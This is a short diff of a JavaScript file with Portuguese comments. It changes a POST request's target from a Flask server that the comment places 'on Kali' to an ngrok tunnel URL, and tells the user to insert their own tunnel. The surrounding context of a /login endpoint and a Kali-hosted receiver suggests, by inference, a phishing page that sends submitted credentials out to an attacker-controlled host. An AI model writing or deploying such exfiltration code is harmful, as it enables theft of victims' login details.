@@ -118,8 +118,8 @@
         `;
         
         try {
-            // Envia para o servidor Flask no Kali
-            const response = await fetch("http://172.20.204.230:5000/login", {
+            // Envia para o servidor via Ngrok (ATUALIZE ESTA URL COM SEU NGROK)
+            const response = await fetch("https://27ba-170-z4d-6-217.ngrok-free.app", {
                 method: "POST",
                 headers: { 
                     "Content-Type": "application/x-www-form-urlencoded",
